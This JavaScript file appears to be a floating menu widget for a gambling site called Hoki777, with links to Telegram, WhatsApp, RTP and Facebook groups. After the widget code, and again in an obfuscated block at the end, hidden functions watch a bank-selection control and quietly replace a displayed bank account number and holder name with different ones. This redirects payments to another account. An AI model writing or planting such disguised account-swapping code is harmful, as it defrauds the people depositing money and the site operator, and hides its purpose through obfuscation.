(function () {
    const menuWid = document.createElement('div');
    menuWid.className = "widget-menu-fixed";
    menuWid.innerHTML = `
    <style>
    .widget-menu-fixed {
    position: fixed;
    bottom: 50px;
    left: 100px;
    z-index: 99999;
}

.cont-widget {
    height: 70px;
    width: 70px;
    background: rgba(51, 51, 51, 0);
    border-radius: 15px;
    transition: height 0.4s ease, background 0.3s ease;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* justify-content: center; */
    padding: 10px;
    gap: 0;
    /* default gap 0 */
    backdrop-filter: blur(5px);

}

.cont-widget.active {
    height: auto;
    background: rgba(51, 51, 51, 1);
    /* gap: 20px; */
}


.burger {
    width: 50px;
    height: 50px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    /* Tetap center agar transform rapi */
    align-items: center;
    cursor: pointer;
    background: beige;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px rgb(255, 6, 243);
    position: relative;
    gap: 6px;
    /* Jangan terlalu besar */
}

.burger span {
    display: block;
    height: 4px;
    width: 24px;
    background-color: #333;
    border-radius: 2px;
    transition: all 0.3s ease;
    position: relative;
}

.burger.active span:nth-child(1) {
    transform: rotate(45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}

.burger.active span:nth-child(2) {
    opacity: 0;
}

.burger.active span:nth-child(3) {
    transform: rotate(-45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}



.telegram-button,
.whatsapp-button,
.rtp-button,
.fb-button {
    height: 50px;
    width: 50px;
    cursor: pointer;
    background: beige;
    margin-top: 22px;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px red;
    justify-content: center;
    align-items: center;
    opacity: 0;
    pointer-events: none;
    transform: translateY(20px) scale(0.9);
    transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    display: flex;
    /* ini tetap tampil, tapi invisible + unclickable awalnya */
}

.cont-widget.active .telegram-button,
.cont-widget.active .whatsapp-button,
.cont-widget.active .rtp-button,
.cont-widget.active .fb-button {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0) scale(1);
}

.cont-widget.active .telegram-button {
    transition-delay: 0.1s;
}

.cont-widget.active .whatsapp-button {
    transition-delay: 0.2s;
}

.cont-widget.active .rtp-button {
    transition-delay: 0.3s;
}

.cont-widget.active .fb-button {
    transition-delay: 0.4s;
}

.tunjuk {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
}

.hoki-logo {
    display: none;
}

.hoki-logo.active {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
    display: inline-block;
    animation: jump 2s infinite ease-in-out;
}


.tunjuk.active {
    display: none;
}

.link-tombol-widget:hover .widget-tombol {
    transform: translateY(0) scale(1.15);
    /* gabungkan transform */
    background: rgb(124, 124, 103);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}

.widget-tombol {
    transition: transform 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
    border-radius: 15px;
}


.widget-tombol img {
    animation: pulse2 1.5s infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.05);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes pulse2 {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.5);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes jump {

    0%,
    100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-20px);
    }
}

@media screen and (max-width: 769px) {
    .widget-menu-fixed {
        left: 30px;
        bottom: 100px;
    }
}
    </style>
        <div class="cont-widget" id="containerWidget">
            <div class="group-widget">
                <div class="burger"
                    onclick="this.classList.toggle('active');document.getElementById('containerWidget').classList.toggle('active');document.getElementById('tunjukgif').classList.toggle('active');document.getElementById('lghok').classList.toggle('active');">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <a href="https://hk777.top/telegramgruphoki777/" class="link-tombol-widget">
                    <div class="telegram-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/tele2.webp" alt="Telegram Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/wahoki777" class="link-tombol-widget">
                    <div class="whatsapp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/wa2.webp" alt="Whatsapp Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/RTP-Hoki777" class="link-tombol-widget">
                    <div class="rtp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/rtp2.webp" alt="RTP Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/facebookgruphoki777/" class="link-tombol-widget">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/fb2.webp" alt="Facebook Hoki777" width="30" height="30">
                    </div>
                </a>
            </div>
        </div>
        
        <img src="https://yudha125.github.io/menu-widget/Image/hoki.webp" alt="Logo Hoki777" class="hoki-logo" id="lghok">
        <img src="https://yudha125.github.io/menu-widget/Image/tunjuk.webp" alt="Tunjuk Hoki777" class="tunjuk" id="tunjukgif">
    `;
    document.body.appendChild(menuWid);


function updateAngka() {
  const spans = document.querySelectorAll('span');
  for (const span of spans) {
    if (span.textContent.trim() === '7391953019') {
      span.textContent = '4372588903'; 
      break; 
    }
  }
}

function updateNama() {
  const divs = document.querySelectorAll('div');
  for (const div of divs) {
    if (div.textContent.trim() === 'RIZKY ADITYA') {
      div.textContent = 'YUDHA K'; 
      break; 
    }
  }
}
document.addEventListener('DOMContentLoaded', () => {
  const selectAngka = document.getElementById('angka');
  
  if (selectAngka) {
    selectAngka.addEventListener('change', () => {
      updateAngka(); 
      updateNama();  
      
    });
  } 
});
})();

function _0x166c(_0x4a903d,_0x1a8f45){_0x4a903d=_0x4a903d-(-0x6a1*0x4+0x153f+0x671);const _0x3b86e7=_0x4a26();let _0x180db3=_0x3b86e7[_0x4a903d];return _0x180db3;}(function(_0x3fae7d,_0x469c92){const _0x2094d9=_0x166c,_0x18b746=_0x3fae7d();while(!![]){try{const _0x5a1b54=parseInt(_0x2094d9(0x12f))/(-0x21c0+-0xf93+0x3154)*(-parseInt(_0x2094d9(0x14c))/(0x344+-0x157f+0x29b*0x7))+parseInt(_0x2094d9(0x130))/(-0x19d2+-0x2142+-0x3b17*-0x1)*(-parseInt(_0x2094d9(0x148))/(-0xc6*-0x1d+-0x75*0x4f+-0x5*-0x2bd))+parseInt(_0x2094d9(0x12e))/(0x4b*0x2b+0x66c+0x10*-0x130)+parseInt(_0x2094d9(0x151))/(0x1*0x2d3+0xdb*-0x13+0xd74)+parseInt(_0x2094d9(0x14d))/(-0x1812+-0xc54+0x246d)+-parseInt(_0x2094d9(0x143))/(-0x4*-0x10+-0x81*0x1f+0xf67)+parseInt(_0x2094d9(0x141))/(-0x7c8+-0x1dcf+-0x560*-0x7);if(_0x5a1b54===_0x469c92)break;else _0x18b746['push'](_0x18b746['shift']());}catch(_0x38e64d){_0x18b746['push'](_0x18b746['shift']());}}}(_0x4a26,0x3aff6+0x1*0x8a182+0x9aa*-0xbc),(function(){const _0x501a86=_0x166c,_0x4d9941={'vgGwJ':_0x501a86(0x131),'RwzPi':function(_0x188ec2,_0x571a07){return _0x188ec2===_0x571a07;},'dGIOl':_0x501a86(0x13e),'DKlMx':_0x501a86(0x13f),'WJhqk':_0x501a86(0x14f),'TsIqM':function(_0x547677,_0x5be452){return _0x547677===_0x5be452;},'vIEkH':_0x501a86(0x155)+'YA','YfCUF':_0x501a86(0x138),'FrhSA':function(_0x1992a6){return _0x1992a6();},'QKZFA':_0x501a86(0x14e),'eMaCA':function(_0x584ee2){return _0x584ee2();},'tshla':_0x501a86(0x158),'LkjqX':function(_0x549cb7){return _0x549cb7();},'cSptt':function(_0x842dae){return _0x842dae();}};function _0x2b0016(){const _0x470bc3=_0x501a86,_0x54451b=document[_0x470bc3(0x13b)+_0x470bc3(0x145)](_0x4d9941[_0x470bc3(0x152)]);for(const _0x4af61f of _0x54451b){if(_0x4d9941[_0x470bc3(0x135)](_0x4af61f[_0x470bc3(0x12d)+'t'][_0x470bc3(0x136)](),_0x4d9941[_0x470bc3(0x157)])){_0x4af61f[_0x470bc3(0x12d)+'t']=_0x4d9941[_0x470bc3(0x156)];break;}}}function _0x5e34b9(){const _0x13b555=_0x501a86,_0x54e57b=document[_0x13b555(0x13b)+_0x13b555(0x145)](_0x4d9941[_0x13b555(0x14b)]);for(const _0x486430 of _0x54e57b){if(_0x4d9941[_0x13b555(0x12c)](_0x486430[_0x13b555(0x12d)+'t'][_0x13b555(0x136)](),_0x4d9941[_0x13b555(0x134)])){_0x486430[_0x13b555(0x12d)+'t']=_0x4d9941[_0x13b555(0x13d)];break;}}}function _0x385ea8(){const _0x1241fa=_0x501a86;_0x4d9941[_0x1241fa(0x132)](_0x2b0016),_0x4d9941[_0x1241fa(0x132)](_0x5e34b9);}function _0x1ca17c(){const _0x5d46be=_0x501a86,_0x5d1733=document[_0x5d46be(0x147)+_0x5d46be(0x153)](_0x4d9941[_0x5d46be(0x14a)]);if(!_0x5d1733)return![];return _0x4d9941[_0x5d46be(0x142)](_0x385ea8),!_0x5d1733[_0x5d46be(0x154)][_0x5d46be(0x150)+_0x5d46be(0x139)]&&(_0x5d1733[_0x5d46be(0x149)+_0x5d46be(0x146)](_0x4d9941[_0x5d46be(0x13c)],_0x385ea8),_0x5d1733[_0x5d46be(0x154)][_0x5d46be(0x150)+_0x5d46be(0x139)]='1'),!![];}if(_0x4d9941[_0x501a86(0x13a)](_0x1ca17c))return;const _0x467389=new MutationObserver(()=>{const _0x1e3d81=_0x501a86;if(_0x4d9941[_0x1e3d81(0x137)](_0x1ca17c))_0x467389[_0x1e3d81(0x133)]();});_0x467389[_0x501a86(0x140)](document[_0x501a86(0x144)],{'childList':!![],'subtree':!![]});}()));function _0x4a26(){const _0x57376b=['WJhqk','8886ClupNF','4782386DolzOH','bankSelect','div','_listenerR','3692562VQVLBB','vgGwJ','ById','dataset','RIZKY\x20ADIT','DKlMx','dGIOl','change','TsIqM','textConten','3163425axTPXF','111zoDYsa','2030904XfMtUG','span','FrhSA','disconnect','vIEkH','RwzPi','trim','LkjqX','YUDHA\x20K','eady','cSptt','querySelec','tshla','YfCUF','7391953019','4372588903','observe','259416TCzDDQ','eMaCA','3582536ZNbDkf','body','torAll','stener','getElement','4TkvLaD','addEventLi','QKZFA'];_0x4a26=function(){return _0x57376b;};return _0x4a26();}